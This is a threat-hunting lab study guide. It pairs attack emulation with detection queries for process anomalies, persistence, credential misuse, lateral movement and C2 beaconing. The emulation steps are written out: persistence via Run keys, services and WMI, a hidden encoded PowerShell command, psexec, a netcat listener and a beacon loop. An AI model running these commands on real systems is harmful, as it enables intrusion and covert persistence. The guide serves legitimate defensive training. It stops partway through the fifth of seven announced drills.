# Hunting Exercises — Guided Drills

> eCTHP · Labs — INE Cybersecurity Certifications Study Guide
>
> Seven guided drills that run end to end on the range from `hunting-range-setup.md`: suspicious process execution, persistence, credential and service-account use, lateral movement, C2 beaconing, exfiltration, and a closing report exercise. Each drill gives you a hypothesis, the telemetry it needs, the queries to run, and what the behaviour should look like — never a canned output. Every action happens on systems you own or are explicitly authorized to use.

## Environment and prerequisites

Build and verify the range first (`hunting-range-setup.md`). You need:

- A **Windows victim** with Sysmon installed from a baseline config, PowerShell script block logging enabled, and its event channels forwarded to a collector.
- A **Linux victim** with `auditd` rules loaded and keyed (at minimum the `exec` key).
- A **collector** you can query (SIEM index, files, or both) holding both victims' telemetry.
- Optionally, an **attacker VM** on the same isolated subnet for the emulation steps, plus a Zeek sensor or a PCAP capture on the lab network for the network drills.
- Each victim snapshotted at the **verified telemetry baseline** from the setup guide.

**Golden rules for every drill:**

- Work only in the isolated range. Check isolation before you start (no bridged adapters, no host integration).
- **Record your emulation in a sealed note before you hunt.** Write down what you ran, on which host, and at what time — then do not read it until your hunt is finished. This is the difference between hunting and reading the answer key.
- Revert to the pre-exercise snapshot between drills. A contaminated baseline invalidates the next drill.
- Never fabricate a result. "I ran these queries over this window and found nothing, and here is the telemetry I confirmed was collecting" is a valid and valuable outcome.

## The drill loop (and how to score yourself)

Every exercise follows the same eight steps. Learn the loop, not just the commands:

```text
1. Revert to the pre-exercise snapshot; confirm telemetry is flowing.
2. Write the hypothesis and the data it requires (before touching the keyboard).
3. Emulate the behaviour. Record it in a sealed note.
4. Hunt without reading the note: query, triage, pivot.
5. Write your findings down, including negative results and confidence.
6. Open the sealed note and compare.
7. Score: found / missed / false positives, and why.
8. Re-run the hunt against a *different* time window or a clean snapshot to prove
   the hunt was not just reading yesterday's artefacts.
```

| Self-scoring question | Why it matters |
| --- | --- |
| Did my hunt surface the emulated behaviour? | Recall — the hunt's actual job |
| How many false positives did I carry into the findings? | Precision — what makes a hunt usable |
| How long did the hunt take, and where did the time go? | The query or the data usually, not the analysis |
| Which query found it fastest? | That query belongs in your starting set for the real environment |
| What telemetry would have made this trivial? | The recommendation you take back to the estate |
| What did I conclude that the data could not support? | Overclaiming is the failure mode to train out |

> A hunt that finds nothing, and can *prove* the data was there to be found, is a professional result. A hunt that finds "something" and cannot say which host, which process, and which evidence supports it is noise with a narrative attached.

## Exercise 1 — Suspicious process execution

**Objective.** Build the reflex for the highest-volume, highest-value endpoint question: what ran, from where, spawned by what, and does any of it not belong?

**Starting hypothesis.** *"A process executed on this host that does not match the normal path/parent combination for its name — a renamed system binary, a scripting host spawned by a document application, or an encoded command line."*

**Data required.** Sysmon Event ID 1 (process creation, with `Image`, `ParentImage`, `CommandLine`, `User`, `Hashes`, `OriginalFileName`); PowerShell Event ID 4104; legacy Security 4688 with command-line auditing; on Linux, `auditd` `EXECVE`/`SYSCALL` records.

**Steps.**

1. Revert the Windows victim to the verified baseline and confirm Sysmon is producing events:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 3
```

2. Define a helper you will reuse in later drills. Sysmon events are XML, so read the fields by name instead of by index:

```powershell
function Get-SysmonEvent {
  param([int]$Id, [int]$Hours = 2)
  Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-Sysmon/Operational'
    Id        = $Id
    StartTime = (Get-Date).AddHours(-$Hours)
  } | ForEach-Object {
    [xml]$x = $_.ToXml()
    $h = @{ TimeCreated = $_.TimeCreated; EventId = $Id }
    foreach ($d in $x.Event.EventData.Data) { $h[$d.Name] = $d.'#text' }
    [pscustomobject]$h
  }
}
```

3. Emulate three execution anomalies, then seal your note:

```powershell
# (a) A system binary copied to a user-writable path and renamed
Copy-Item C:\Windows\System32\notepad.exe "$env:TEMP\svchost.exe"
& "$env:TEMP\svchost.exe"

# (b) An encoded PowerShell command — generate the payload yourself so you know it
$cmd = 'Write-Output "LAB-EXEC-CHECK"'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

```cmd
:: (b) continued: paste the base64 string you just generated
powershell.exe -nop -w hidden -enc <paste-the-base64-you-generated>

:: (c) A LOLBin doing something it does not normally do
certutil.exe -hashfile C:\Windows\System32\cmd.exe SHA256
```

On the Linux victim, add one execution from an unexpected location or by an unexpected parent:

```bash
# A binary executed from a world-writable directory, keyed by the audit rule
cp /usr/bin/id /tmp/lab-id && /tmp/lab-id
sudo ausearch -k exec -ts recent -i
```

4. Now hunt. Start with path and parent anomalies:

```powershell
# Process images outside the expected system directories
Get-SysmonEvent -Id 1 | Where-Object { $_.Image -notlike 'C:\Windows\*' } |
  Select-Object TimeCreated, User, ParentImage, Image, CommandLine
```

```kusto
// The same hypothesis in Sentinel KQL
DeviceProcessEvents
| where Timestamp > ago(2h)
| where FolderPath !startswith @"C:\Windows\"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, FolderPath, ProcessCommandLine
| sort by Timestamp desc
```

5. Pivot on **masquerading**: Sysmon's `OriginalFileName` is read from the binary's version resource, so a renamed copy still reports its true identity.

```powershell
# Image name versus embedded original filename — a classic masquerading indicator
Get-SysmonEvent -Id 1 |
  Where-Object { $_.OriginalFileName -and ($_.Image -notlike "*$($_.OriginalFileName)") } |
  Select-Object TimeCreated, User, Image, OriginalFileName, ParentImage, CommandLine

# Confirm by hash: the same content under two names
Get-FileHash "$env:TEMP\svchost.exe", C:\Windows\System32\notepad.exe
```

6. Hunt encoded and hidden command lines, then correlate with script block logging:

```powershell
# Encoded or hidden-window PowerShell in the process-creation stream
Get-SysmonEvent -Id 1 |
  Where-Object { $_.CommandLine -match '(?i)-enc(odedcommand)?\s|-w(indowstyle)?\s+hidden|-nop' } |
  Select-Object TimeCreated, User, Image, ParentImage, CommandLine
```

```powershell
# The decoded script block should exist even when the command line was encoded
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-PowerShell/Operational'; Id = 4104
} -MaxEvents 200 | Where-Object { $_.Message -match 'LAB-EXEC-CHECK' } |
  Select-Object TimeCreated, @{n='Snippet';e={ $_.Message.Substring(0,[Math]::Min(200,$_.Message.Length)) }}
```

```text
# Kibana/KQL shape for the same hunt
event.category : "process" and process.command_line : (*-enc* or *EncodedCommand* or *-nop*)
```

7. Hunt the Linux side and close the loop with file-level evidence:

```bash
# Executions from world-writable paths, from the audit records
sudo ausearch -k exec -ts recent -i | grep -E "exe=|comm=|a0="

# Did the binary's on-disk copy change? Compare against the package original
ls -l /tmp/lab-id /usr/bin/id
```

**What you should find.** Described behaviourally, because a hunt is a claim about behaviour:

- At least one Sysmon Event ID 1 whose `Image` sits outside `C:\Windows\` while its `OriginalFileName` (or its hash) matches a system binary — the renamed `notepad.exe` case. The parent is your interactive shell, which is a second anomaly: a "service-looking" binary whose parent is a user process.
- One process-creation event for `powershell.exe` whose command line contains an encoded argument, paired with a `4104` script block that shows the *decoded* content. The encoding is not evasion against script block logging; that pairing is the point of the drill.
- `certutil.exe` invoked with a hashing argument where the host's baseline has it doing nothing at all. Benign in itself — the finding is the *binary usage that does not fit the baseline*, and a real `certutil` download would look the same on the wire.
- On Linux, an `EXECVE` record whose `exe` path is under `/tmp`, with the same `auid` as your login session. Note that `auid` survives `sudo`: that is what makes attribution possible.

**Pivots.**

- From the anomalous process to its children and siblings (`ParentProcessGuid`/`ParentProcessId` → all events bearing that parent).
- From the file hash to the file-system timeline: when was this binary written, and by which process (Sysmon ID 11 + MFT/USN timestamps)?
- From the process to the network (Sysmon ID 3) to see whether the anomalous binary talked to anything.
- From the Linux `exe` inode to `auditd`'s `PATH` records for everything else that process touched.
- From the account (`User`) to its logon events — was it interactive, a service, or an unwitting credential reuse?

**Closing questions.**

- Which single field would have let you find the renamed binary fastest — and is it populated in your environment?
- If 4104 had not been enabled, what would you have concluded from the encoded command line alone?
- Which of your three emulated anomalies would a *signature-based* detection have missed, and why?
- Name the false positives your path-based query returned on a clean baseline snapshot. Could you write the hunt so they do not appear?

## Exercise 2 — Persistence: Run keys, services, scheduled tasks, WMI

**Objective.** Hunt for persistence that would survive a reboot, and learn to tell newly created persistence from the long tail of legitimate autostart entries.

**Starting hypothesis.** *"Persistence was created on this host recently, pointing at a binary in a user-writable location or at a command line that does not match the legitimate owner of that mechanism."*

**Data required.** Sysmon 12/13/14 (registry writes), 11 (file creation), 19/20/21 (WMI events); Security 4697 and System 7045 (service installs); Security 4698/4699/4700/4701/4702 (scheduled tasks); TaskScheduler Operational 106; the presence of `C:\Windows\System32\Tasks\*` files; on Linux, `auditd` watch keys plus `cron`/`systemd` state.

**Steps.**

1. Emulate four persistence mechanisms, and seal your note. This block needs an **elevated** shell (the per-user Run key does not, but service creation and the WMI subscription do):

```cmd
:: (a) A per-user Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v LabUpdater /t REG_SZ /d "%TEMP%\svchost.exe" /f

:: (b) A scheduled task at logon
schtasks /create /tn "LabMaintenance" /tr "%TEMP%\svchost.exe" /sc onlogon /ru labuser /f

:: (c) A Windows service
sc create LabSvc binPath= "%TEMP%\svchost.exe" start= auto
```

```powershell
# (d) WMI event-subscription persistence — the fileless classic
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
  Name = 'LabFilter'; EventNamespace = 'root\cimv2'; QueryLanguage = 'WQL'
  Query = 'SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA "Win32_PerfFormattedData_PerfOS_System"'
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
  Name = 'LabConsumer'; CommandLineTemplate = "$env:TEMP\svchost.exe"
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
  Filter = $filter; Consumer = $consumer
}
```

2. Hunt the registry branch of persistence — Sysmon 13 with the Run-key paths as `TargetObject`:

```powershell
Get-SysmonEvent -Id 13 |
  Where-Object { $_.TargetObject -match 'CurrentVersion\\Run' } |
  Select-Object TimeCreated, User, Image, TargetObject, Details

# Broader: any autostart-relevant registry path written recently
Get-SysmonEvent -Id 13 |
  Where-Object { $_.TargetObject -match 'CurrentVersion\\(Run|RunOnce)|Winlogon|Image File Execution Options|Services\\' } |
  Select-Object TimeCreated, User, Image, TargetObject, Details
```

3. Hunt service creation. Two sources, and you want both:

```powershell
# System channel: the Service Control Manager's own record of an install
Get-WinEvent -FilterHashtable @{ LogName = 'System'; Id = 7045; StartTime = (Get-Date).AddHours(-4) } |
  Select-Object TimeCreated, Message

# Security channel: the same install as an audited event, when service auditing is on
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4697 } -MaxEvents 20 |
  Select-Object TimeCreated, Message
```

4. Hunt scheduled tasks from both the event stream and the file system — the task definition on disk is harder for an attacker to hide than an event:

```powershell
# Creation events
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4698 } -MaxEvents 20 | Select-Object TimeCreated, Message
Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-TaskScheduler/Operational'; Id = 106 } -MaxEvents 20 |
  Select-Object TimeCreated, Message

# On-disk task definitions, newest first — the persistence artefact itself
Get-ChildItem C:\Windows\System32\Tasks -Recurse -File |
  Sort-Object LastWriteTime -Descending | Select-Object -First 10 LastWriteTime, FullName
```

5. Hunt WMI persistence. Sysmon records the subscription objects; the WMI activity channel records the consumer registration:

```powershell
Get-SysmonEvent -Id 19 | Select-Object TimeCreated, User, EventNamespace, Name, Query
Get-SysmonEvent -Id 20 | Select-Object TimeCreated, User, EventNamespace, Name, Destination
Get-SysmonEvent -Id 21 | Select-Object TimeCreated, User, EventNamespace, Filter, Consumer

# The repository that holds it — the artefact to collect, not to query blindly
Get-ChildItem C:\Windows\System32\wbem\Repository | Select-Object Name, Length, LastWriteTime
```

6. Hunt Linux persistence surfaces:

```bash
# Audit keys your rules watch (identity, privilege_escalation, ssh_config)
sudo ausearch -k identity -ts recent -i
sudo ausearch -k privilege_escalation -ts recent -i

# Scheduled execution and boot-time units
crontab -l
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
systemctl list-unit-files --state=enabled

# SSH key persistence
ls -la ~/.ssh/ && cat ~/.ssh/authorized_keys
```

```bash
# One-off audit watches for this drill (runtime rules; not persistent)
sudo auditctl -w /etc/cron.d -p wa -k cron_persist
sudo auditctl -w /etc/systemd/system -p wa -k systemd_persist
sudo auditctl -w /root/.ssh -p wa -k ssh_keys
sudo auditctl -l
```

7. Take the diff-based view: this is where persistence hunting becomes fast. Snapshot Autoruns before and after (see `../tools/endpoint-tools.md`) and compare.

```powershell
$base = Import-Csv C:\lab\exports\autoruns-baseline.csv
$now  = Import-Csv C:\lab\exports\autoruns-current.csv
Compare-Object $base $now -Property 'Entry Location','Entry','Image Path' |
  Where-Object SideIndicator -eq '=>'
```

**What you should find.**

- A registry value-set event (`13`) on the Run key whose `Image` is the process that wrote it — `reg.exe`, or your shell — and whose `Details` is the path in `%TEMP%`. The pair (who wrote it, what it points at) is the finding; either one alone is weak. That parenthetical "who wrote it" is the advantage of endpoint registry telemetry over a registry snapshot.
- A `7045` service-install event naming a binary outside `System32`, with the service type and start type in the message. The `4697` counterpart appears only if service auditing is configured — note which you got, because the gap is a coverage fact you should report.
- A `4698` task-creation event plus a new file under `C:\Windows\System32\Tasks\` whose `LastWriteTime` matches. Two independent artefacts for one behaviour: that is corroboration.
- Sysmon `19`, `20`, and `21` events for the filter, consumer, and binding — the WMI persistence triple. If you found the consumer and binding but no filter, say so; the set is diagnostic.
- On Linux, an `auditd` record for the watch key only if you added the runtime watch *before* writing the file. Without the watch there is no record, which is exactly the coverage lesson this drill is designed to teach.

**Pivots.**

- From `Details` (the persistence target path) to Sysmon ID 1 to see whether the payload already executed, and ID 11 to see when it was written.
- From the `Image` that wrote the persistence to every other registry key and file it touched in the same minute.
- From the new service name to `Get-Service`/osquery `services` to confirm the current state, and to `SYSTEM\CurrentControlSet\Services\<name>` for the full definition.
- From the task to its `Actions` and `Triggers` (Task Scheduler GUI or the task XML) — the trigger tells you *when* the persistence fires, which is how you catch it running.
- From the WMI consumer to the WMI repository file timestamps to detect any other subscription you did not create.

**Closing questions.**

- Which single artefact would you keep if you could keep only one, and why (the event, or the on-disk definition)?
- If you had only a registry snapshot and no registry-write telemetry, what could you *not* have concluded?
- Your Run-key hunt on a clean baseline will match legitimate software. How would you tune it without blinding yourself?
- Which of the four persistence mechanisms would a reboot-only investigation miss completely?

## Exercise 3 — Credential use and service accounts

**Objective.** Hunt for credential use that does not match the account's purpose — the pivot point of nearly every real intrusion.

**Starting hypothesis.** *"An account, particularly a service account, authenticated in a way, at a time, or from a source that is inconsistent with what that account exists to do."*

**Data required.** Security 4624 (logon, with `LogonType`), 4625, 4634/4647, 4648 (explicit credentials), 4672 (special privileges), 4720/4722/4724/4726/4732 (account and group changes), 4768/4769/4771/4776 (Kerberos and NTLM), 4798/4799 (group enumeration); Linux `auth.log`, `auditd` `USER_AUTH`/`USER_ACCT` records, `sudo` records.

**Steps.**

1. Establish the baseline first. This drill only works if you know what normal looks like:

```powershell
# Which logon types do the lab accounts normally use?
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624; StartTime = (Get-Date).AddDays(-3) } |
  ForEach-Object {
    [xml]$x = $_.ToXml()
    $d = @{}
    foreach ($f in $x.Event.EventData.Data) { $d[$f.Name] = $f.'#text' }
    [pscustomobject]@{ Time = $_.TimeCreated; User = $d['TargetUserName']; Type = $d['LogonType']; Src = $d['IpAddress'] }
  } | Group-Object User, Type | Select-Object Count, Name | Sort-Object Count -Descending
```

2. Emulate credential behaviours and seal your note. Steps (b) and (e) need elevation:

```cmd
:: (a) Explicit use of another identity, leaving a 4648 behind
runas /user:labuser "cmd /c whoami"

:: (b) A service account, created and used interactively (which is the anomaly)
net user svc_labbackup LabOnlyPassw0rd! /add
net localgroup Administrators svc_labbackup /add
```

```powershell
# (c) Enumerate stored credentials on the host
cmdkey /list

# (d) Authenticate to a share as another identity. The resulting network logon
#     (type 3) is logged on the host that SERVES the share, not on the client —
#     so create a share here and connect to it over this host's own address.
#     (Against a Linux/Samba target the record lands in auth.log instead.)
mkdir C:\labshare
net share labshare=C:\labshare /grant:labuser,FULL
net use \\10.10.10.11\labshare /user:labuser LabOnlyPassw0rd!
```

```bash
# (e) Linux: a failed authentication burst followed by a success
su - labuser -c 'whoami' 2>/dev/null || true
sudo -l
sudo ausearch -m USER_AUTH,USER_ACCT -ts recent -i
sudo grep -E 'sudo|su:' /var/log/auth.log | tail -20
```

3. Hunt the logon-type distribution, which is where the anomaly lives:

```powershell
# Logons that are unusual for the account: service accounts logging on interactively
# or over RDP are prime candidates. LogonType meanings are in ../cheatsheets/windows-artifacts.md
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624; StartTime = (Get-Date).AddHours(-4) } |
  ForEach-Object {
    [xml]$x = $_.ToXml()
    $d = @{}
    foreach ($f in $x.Event.EventData.Data) { $d[$f.Name] = $f.'#text' }
    [pscustomobject]@{
      Time = $_.TimeCreated; User = $d['TargetUserName']; Type = $d['LogonType']
      Src = $d['IpAddress']; Process = $d['ProcessName']
    }
  } | Where-Object { $_.User -match '^svc_' -or $_.Type -in '2','10','11' } |
  Sort-Object Time -Descending
```

4. Hunt explicit-credential and privilege events, and correlate them with what happened next:

```powershell
# 4648 — a process used credentials other than the current session's
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4648; StartTime = (Get-Date).AddHours(-4) } |
  Select-Object TimeCreated, Message

# 4672 — special privileges assigned at logon (what an admin session produces)
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4672 } -MaxEvents 20 | Select-Object TimeCreated, Message

# 4720/4732 — account created, then added to a privileged group
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = @(4720, 4732, 4724) } -MaxEvents 20 |
  Select-Object TimeCreated, Id, Message
```

5. Look for enumeration and for Kerberos/NTLM anomalies:

```powershell
# 4798/4799 — group membership enumeration, a reconnaissance smell in volume
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = @(4798, 4799) } -MaxEvents 20 | Select-Object TimeCreated, Id, Message

# 4769 — service ticket requests. Check the encryption type field in the message:
# RC4 (0x17) requests for service accounts are a kerberoasting heuristic, not a verdict.
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4769 } -MaxEvents 20 | Select-Object TimeCreated, Message, Id

# 4776 — NTLM credential validation, a fallback path worth watching
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4776 } -MaxEvents 20 | Select-Object TimeCreated, Message
```

6. Pivot from credentials to what they bought — that is what makes it a hunt rather than a log review:

```powershell
# After the logon, what did the account do? Services installed, tasks created,
# shares accessed — reuse the helpers from Exercises 1 and 2 and filter by account.
Get-SysmonEvent -Id 1 | Where-Object { $_.User -match 'svc_labbackup' } |
  Select-Object TimeCreated, User, ParentImage, Image, CommandLine
```

```text
# Kibana/KQL shape: logon burst followed by privileged activity on the same host
event.code : ("4624" or "4672") and winlog.event_data.TargetUserName : "svc_*"
```

**What you should find.**

- A **4648** for `runas` naming both the subject identity and the target identity, with `ProcessName` pointing at `runas.exe`. The critical reading: 4648 records the *attempt to use* explicit credentials, which is why it is a hunting favourite — it appears whether or not the credential worked.
- A type-3 network logon (4624 with `LogonType = 3`) for the `net use` against `labshare`, recorded on the host that served it, with `IpAddress` naming the client. Note that network-type logons are the ones to correlate with file-share access events (5140/5145, when object-access auditing is on) — and that the same operation against a Samba target leaves its record in the Linux host's `auth.log` instead, which is a coverage fact worth stating in your report.
- A **4720** (account created) and then a **4732** (member added to a local group) for the service-account emulation — in that order, within seconds. Sequential account-then-privilege events are themselves a detection opportunity.
- Then the behavioural finding, which is the real answer: the service account's **subsequent logons are interactive** (type 2) or remote (type 10) rather than service (type 5). An account created to run a backup should almost never open a desktop session. That single inconsistency is the strongest signal in this drill.
- On Linux, `USER_AUTH`/`USER_ACCT` records from `auditd` and matching `sudo` lines in `auth.log` — two independent sources for one authentication, which is the corroboration standard.

**Pivots.**

- From `TargetUserName` to all of that account's events in the window, ordered — a session reconstruction.
- From `IpAddress` in the logon event to that host's own logs, to confirm the source end of the connection.
- From the logon time to process creations in the next few minutes on the destination host.
- From 4720 to the account's object attributes and to any subsequent 4722 (enabled) or 4724 (password reset).
- From `LogonId` in a 4624 to the same `LogonId` in 4672 and 4688 — the field that ties a session to the activity it produced inside a single host.

**Closing questions.**

- What is the difference between what 4624 tells you and what 4648 tells you, and why do you need both?
- If the environment did not audit account management, which of your findings would have become invisible?
- Which of the emulated behaviours was *unsuccessful* but still left a hunting trail?
- Why is an account's *purpose* — not its privileges — the key to this hunt?

## Exercise 4 — Lateral movement

**Objective.** Detect host-to-host movement across the estate, and distinguish it from administrative tooling, scanners, and backup traffic.

**Starting hypothesis.** *"An internal host initiated connections to administrative services on other internal hosts, in a pattern that does not match the estate's normal administration."*

**Data required.** Zeek `conn.log` (internal-to-internal, ports 445/3389/5985/22/135), `smb_files.log`, `smb_mapping.log`, `ntlm.log`; Windows 4624 type 3, 5140/5145 (share access); Sysmon 3 (network connection with the owning process); Linux `auth.log`/`auditd`.

**Steps.**

1. Revert the snapshots, confirm Zeek (or your capture) is running on the lab interface, and note the capture start time.

2. Emulate movement from the attacker VM toward both victims, and seal your note:

```bash
# SMB enumeration and a session against the Windows victim
smbclient -L //10.10.10.11 -U labuser
impacket-psexec labuser:'LabOnlyPassw0rd!'@10.10.10.11     # older releases: psexec.py

# SSH into the Linux victim (check your credentials first — a failed attempt still logs)
ssh labuser@10.10.10.12 'whoami; hostname'
```

```powershell
# From the Windows victim: remote service creation over SMB — the classic PsExec shape.
# sc.exe talks to the Service Control Manager, so it needs a WINDOWS target: for the
# drill, point it at this same host over its own address. With a second Windows VM,
# target that instead. Run it only between your own lab hosts, and clean up afterwards.
sc.exe \\10.10.10.11 create LabRemote binPath= "cmd.exe /c whoami" start= demand
sc.exe \\10.10.10.11 delete LabRemote
```

3. Hunt the fan-out in Zeek — the shape of movement, before you look at any single session:

```bash
# Internal-to-internal connections on administrative ports
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p conn_state service \
  | awk '$3==445 || $3==3389 || $3==5985 || $3==22 || $3==135' \
  | sort | uniq -c | sort -nr | head -30

# One source touching many internal destinations: the fan-out signature
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p \
  | awk '{ print $1, $2 }' | sort -u \
  | awk '{ c[$1]++ } END { for (k in c) print c[k], k }' | sort -nr | head -10

# SMB and NTLM detail: who authenticated where, over which share
cat smb_files.log 2>/dev/null | zeek-cut id.orig_h id.resp_h name action | sort | uniq -c | sort -nr | head
cat ntlm.log 2>/dev/null | zeek-cut id.orig_h id.resp_h username hostname success | sort | uniq -c | sort -nr | head
```

4. Hunt the Windows side and attach a process to the movement:

```powershell
# Network logons (type 3) with their source address — movement seen from the destination
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624; StartTime = (Get-Date).AddHours(-4) } |
  ForEach-Object {
    [xml]$x = $_.ToXml()
    $d = @{}; foreach ($f in $x.Event.EventData.Data) { $d[$f.Name] = $f.'#text' }
    if ($d['LogonType'] -eq '3') {
      [pscustomobject]@{ Time = $_.TimeCreated; User = $d['TargetUserName']; From = $d['IpAddress']; Process = $d['ProcessName'] }
    }
  } | Sort-Object Time -Descending

# Share access (needs object-access auditing) and the network connection events with a process owner
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = @(5140, 5145) } -MaxEvents 20 | Select-Object TimeCreated, Id, Message
Get-SysmonEvent -Id 3 | Where-Object { $_.DestinationPort -in 445,3389,5985,135 } |
  Select-Object TimeCreated, User, Image, DestinationIp, DestinationPort, Initiated
```

```kusto
// Sentinel KQL shape: internal fan-out on administrative ports
DeviceNetworkEvents
| where Timestamp > ago(4h)
| where RemotePort in (445, 3389, 5985, 135) and ActionType == "ConnectionSuccess"
| summarize Attempts = count(), Targets = dcount(RemoteIP) by DeviceName, InitiatingProcessFileName
| where Targets > 3
| sort by Targets desc
```

5. Hunt the Linux destination:

```bash
# Who authenticated to this host, and from where
sudo grep -E 'sshd|Accepted|Failed' /var/log/auth.log | tail -30
last -n 20

# An unexpected local account creation or privileged command from a remote session
sudo ausearch -m USER_AUTH,USER_ACCT,CRED_ACQ -ts recent -i
sudo ausearch -k exec -ts recent -i | grep -E "a0=|exe=" | head -30
```

**What you should find.**

- In `conn.log`, a small number of internal-to-internal connections on 445/22/3389/5985 where your lab baseline was zero. **The finding in this drill is the baseline, not the individual connection** — if your range normally has no SMB traffic, the first one is remarkable by definition.
- In `smb_files.log`/`ntlm.log`, an authentication over SMB naming the identity you used, with `success` reflecting whether it worked. A failed SMB authentication followed by a successful one is a distinctly hunt-worthy sequence.
- On the Windows victim, a **4624 type 3** whose `IpAddress` is the attacker VM and whose `ProcessName` is a system process (`System` or the SMB server) rather than a user application — because the logon was *network* authentication, not a local process. That distinction is how you tell a network logon from an interactive one at a glance.
- Corroboration from Sysmon ID 3 only on the *initiating* side: the destination host has a logon event, the source host has a process-owned connection. Reconstructing the pair is the exercise.
- On the Linux victim, `sshd` lines in `auth.log` and matching `auditd` `USER_ACCT`/`USER_AUTH` records. Note whether `last` shows the session — session records persist after the fact, which matters for a hunt that runs later.

**Pivots.**

- From the source IP in a destination-side logon event to the source host's Sysmon ID 3 for the owning process — the process is what turns movement into attribution.
- From the movement account to its other destinations in the same window (one credential, many hosts is the worm/admin-tooling signature).
- From SMB activity to the named pipe or service created (Sysmon 17/18, `7045` on the destination) — remote service creation is how remote execution actually happens.
- From a Windows destination to the Zeek record for the same flow, to see byte counts and duration that the event log does not carry.
- From the timeline of one host to the others, ordered, to build the movement path.

**Closing questions.**

- Which confounder would most plausibly explain this same fan-out in a real enterprise, and what would you check to rule it out?
- If your capture point sat only at the network edge, what internal movement would be invisible, and why?
- What does a destination-side logon event give you that a source-side connection event does not?
- Why is remote *service creation* a stronger signal than a remote *file copy*?

## Exercise 5 — C2 and beaconing

**Objective.** Find a command-and-control channel from its timing rather than its content — the network hunt that works even when everything is encrypted.

**Starting hypothesis.** *"One internal host is making regular, low-volume connections to a single external destination, on a consistent port, with low variance in interval and payload size."*

**Data required.** Zeek `conn.log` (required), `dns.log`, `ssl.log`; RITA (or your own delta analysis) for scoring; proxy logs if present; Sysmon 3 and 22 for process attribution on the endpoint.

**Steps.**

1. Confirm the capture is running and note its start time. Beacon analysis needs a window long enough to contain many connections — at least twenty intervals per candidate pair is a reasonable floor.

2. Emulate a beacon and seal your note. On the Windows victim:

```powershell
# A lab beacon: connect to the attacker listener every ~30 seconds, as a real implant would.
# Run it in a window you can close, and remember the start time.
$target = '10.10.10.50'; $port = 4444
while ($true) {
  try { $c = New-Object Net.Sockets.TcpClient($target, $port); $c.Close() } catch { }
  Start-Sleep -Seconds 30
}
```

```bash
# Attacker side: a listener that accepts and logs the connections
nc -lvnp 4444
```

For a DNS variant, add a lab-only name that only your range resolves, and query it on a loop; a resolution *attempt* is recorded by Sysmon ID 22 even when the lookup fails:

```powershell
1..20 | ForEach-Object {
  Resolve-DnsName "beacon$_.lab.internal" -ErrorAction SilentlyContinue
  Start-Sleep -Seconds 20
}
```

3. Hunt with your own arithmetic before reaching for a tool — this is the analysis you must be able to do without one:

```bash
# Connections to one destination, ranked: counts and total duration
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes \
  | sort | uniq -c | sort -nr | head -20

# Inter-arrival deltas per conversation (low spread = a machine-like interval)
cat conn.log \
  | zeek-cut id.orig_h id.resp_h id.resp_p ts \
  | sort -k1,1 -k2,2 -k3,3n -k4,4n \
  | awk '{ key=$1" "$2" "$3; if (key==prev) { d=$4-last;
             if (key in n) { n[key]++; s[key]+=d; ss[key]+=d*d } else { n[key]=1; s[key]=d; ss[key]=d*d } }
           prev=key; last=$4 }
         END { for (k in n) if (n[k]>=10) { m=s[k]/n[k]; v=ss[k]/n[k]-m*m; if (v<0) v=0;
                 printf "%d conns  mean_sec %.1f  stddev_sec %.1f  %s\n", n[k]+1, m, sqrt(v), k } }' \
  | sort -k6,6n | head -20
```

4. Score it with RITA, which does the same statistics over a whole log set and ranks candidates for you:

```bash
rita import --logs /lab/zeek/logs --database beacon-drill
rita view beacon-drill
# Read the beacon modifiers, not only the score: they explain what raised it.
```

5. Check the DNS and TLS side for the same conversation, then attribute it to a process:

```bash
# Repeated lookups of the same name, per client
cat dns.log | zeek-cut id.orig_h query qtype rcode | sort | uniq -c | sort -nr | head -20

# TLS server names and certificate details for the destination
cat ssl.log | zeek-cut id.orig_h id.resp_h server_name version validation_status | sort | uniq -c | sort -nr | head -20
```

```powershell
# Which process owns the connection? Sysmon ID 3 answers it directly.
Get-SysmonEvent -Id 3 | Where-Object { $_.DestinationIp -eq '10.10.10.50' } |
  Select-Object TimeCreated, User, Image, DestinationIp, DestinationPort, Initiated

# And which names the host tried to resolve
Get-SysmonEvent -Id 22 | Where-Object { $_.QueryName -match 'lab\.internal' } |
  Select-Object TimeCreated, Image, QueryName, QueryStatus
```

```spl
// Splunk: the same hunt over proxy logs, for environments with no packet capture
index=proxy
| sort 0 + _time
| streamstats current=f last(_time) as prev by src_ip, dest_host
| eval delta = _time - prev
| stats count avg(delta) as avg_delta stdev(delta) as jitter sum(bytes_out) as uploaded by src_ip, dest_host
| where count > 20 and jitter < 5
```

**What you should find.**

- For the beacon pair, a connection count in the tens, a **mean inter-arrival close to your 30-second sleep**, and a **standard deviation small relative to the mean**. The ratio (coefficient of variation) is the number to quote in your finding — not the raw count.
